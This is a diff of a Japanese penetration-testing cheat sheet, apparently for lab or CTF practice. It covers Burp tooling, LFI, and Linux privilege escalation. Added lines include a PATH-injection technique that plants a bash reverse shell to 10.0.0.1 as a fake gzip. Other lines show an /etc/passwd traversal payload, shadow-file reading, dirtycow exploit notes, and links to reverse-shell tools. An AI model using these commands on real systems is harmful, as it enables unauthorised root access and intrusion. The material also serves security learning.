@@ -334,6 +334,20 @@ LFIなどを利用する時にも使用。
 
 ![](./image/2021-05-06-17-25-26.png)
 
+#### Intruder
+診断したいパラメータ部分に、自動で挿入を行ってくれる。  
+これを利用することで、Repeterを用いた手動による検査ではなく、SQLインジェクションなどを自動化することが可能。  
+また、ログインページのブルートフォースなどにも使用可能。
+
+
+#### Repeater
+HTTPリクエストをBurpから直接送信することで、繰り返しHTTPリクエストを送信することが可能。  
+この機能を用いて、ログインフォームやOSコマンドインジェクションが疑われる箇所に対して、効率よく様々なスクリプトを挿入可能。
+
+#### Do intercept(Response to this request)
+HTTPレスポンスの改ざんが可能。  
+これを利用することで、ステータスコード「302 Found」などで目的のページにたどり着く前に移動させられる際に、「200 Found」に変更してやることで目的のページへたどり着くことが可能。
+
 ### LFI
 ```
 http://<url>/script.php?page=../../../../../../../../etc/passwd
@@ -1042,7 +1056,7 @@ cewl https://test.com/ -w dict.txt
 crunch 2 3 -o dict.txt
 ```
 
-### Cupp
+### cupp
 対話形式で個人をプロファイリングすることで、ワードリストを作成する。  
 誕生日、ニックネーム、ペットの名前などを対話形式で答えていく。
 ```
@@ -1083,16 +1097,17 @@ aircrack-ng <filename>.cap
 # Privilege Escalation
 ## Linux
 ### チェック項目
-- tty shellの獲得
+- tty shell
 - linpeas.shの実行(列挙)
 - カーネルバージョンの確認(uname -a)
 - sudoコマンドの権限確認(sudo -l)
 - cronジョブの確認(crontab，systemd timer)
+- SUID(find / -perm -u=s -type f 2>/dev/null)
 - 開いているポートの確認(netstat -tulpn)
 - 実行中のプロセスの確認(ps -aux，pspy)
-- SUIDが有効になっているバイナリの列挙
 - パスワードがWebアプリケーションのスクリプトにハードコーディングされていないか確認
 - pspyを使用してuid=0(root権限)で定期的に実行されているスクリプトがないか確認
+- その他テクニック
 
 
 ### tty shell
@@ -1169,26 +1184,6 @@ sudo systemctl start datetest.service
 sudo systemctl start datetest.timer
 ```
 
-### Linuxで開いているすべてのポートを表示する方法
-```
-netstat -tulpn
-netstat -an(linux以外)
-```
-
-### 実行中のプロセスを確認
-```
-ps -aux
-```
-
-### ファイルの検索
-```
-find / -name <ファイル名> -type f 2>>/dev/null
-```
-- /...ファイルシステム全体を検索
-- -name...名前の指定
-- -type f...ディレクトリではなく、ファイル検索を指定
-- 2>>/dev/null...全てのエラーを破棄
-
 ### SUID
 SUIDはset user IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
 これを利用して、LinuxではSUIDビットが有効になってファイル所有者がrootになっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。
@@ -1220,7 +1215,6 @@ find / -perm -4000 -type f 2>/dev/null
 
 列挙後、権限昇格に使えそうなものをGTFOで調べる  
 https://gtfobins.github.io/
-
 
 ### chmod777に設定したfile/dirを検索
 ```
@@ -1265,6 +1259,27 @@ perl:
 cat etc/shadow
 ```
 
+#### ファイルの検索
+```
+find / -name <ファイル名> -type f 2>>/dev/null
+```
+- /...ファイルシステム全体を検索
+- -name...名前の指定
+- -type f...ディレクトリではなく、ファイル検索を指定
+- 2>>/dev/null...全てのエラーを破棄
+
+
+### 開いているポートの確認
+```
+netstat -tulpn
+netstat -an(linux以外)
+```
+
+### 実行中のプロセスを確認
+```
+ps -aux
+```
+
 ### *.sh実行時に「bad interpreter: No such file or directory」が表示されたら
 改行コードをCRLFからLFに置換して実行できるかを確認する。
 ```
@@ -1275,24 +1290,26 @@ sed -i 's/\r//' *.sh
 ps auxコマンドでは確認できない定期的にUID=0(root権限)で実行されているスクリプトを確認することができる。  
 馴染みのないプロセスが動作している場合、そのプロセスが権限昇格の鍵になる場合もあるため、要チェック。  
 
-### tools
-php-reverse-shell:  
-https://github.com/pentestmonkey/php-reverse-shell   
 
-privilege-escalation-awesome-scripts-suite:  
-https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
+### その他テクニック
+#### Path Injection
+sudo・root権限で実行可能なスクリプト内にgzipやpsコマンドが記述されている場合、自分が用意したreverse shellなどを実行させるようにパスを書き換える。  
+スクリプト実行時にroot権限でreverse shellが得られる。
 
-pspy:  
-https://github.com/DominicBreuker/pspy  
+```
+echo $PATH
+cd /tmp
+# gzipの部分はインジェクションさせたいコマンド
+echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" > gzip
+chmod 777 gzip
+export PATH=/tmp:$PATH
+# root権限で動かせるスクリプトなどを実行(前提としてスクリプト内で上記のgzipなどが記述されている)
+./backup.sh
+whoami → root
+```
 
-SUID3NUM:  
-https://github.com/Anon-Exploiter/SUID3NUM
 
-linux-exploit-suggester2:    
-https://github.com/jondonas/linux-exploit-suggester-2
-
-
-### ユーザを指定してコマンドを実行
+#### ユーザを指定してコマンドを実行
 ```
 www-data@bashed:/$ sudo -l
 Matching Defaults entries for www-data on bashed:
@@ -1306,7 +1323,7 @@ scriptmanager@bashed:/$ whoami
 scriptmanager
 ```
 
-### kernel exploit
+#### kernel exploit
 #### dirtycow
 ・40839.c(dirty.c)
 パスワードを自身で入力して、firefaltというアカウントを作成する
@@ -1357,6 +1374,23 @@ gcc cowroot.c -o cowroot -pthread
 * root@box:/root/cow# id
 * uid=0(root) gid=1000(foo) groups=1000(foo)
 ```
+
+#### tools
+php-reverse-shell:  
+https://github.com/pentestmonkey/php-reverse-shell   
+
+privilege-escalation-awesome-scripts-suite:  
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
+
+pspy:  
+https://github.com/DominicBreuker/pspy  
+
+SUID3NUM:  
+https://github.com/Anon-Exploiter/SUID3NUM
+
+linux-exploit-suggester2:    
+https://github.com/jondonas/linux-exploit-suggester-2
+
 
 ## Windows
 ### チェック項目
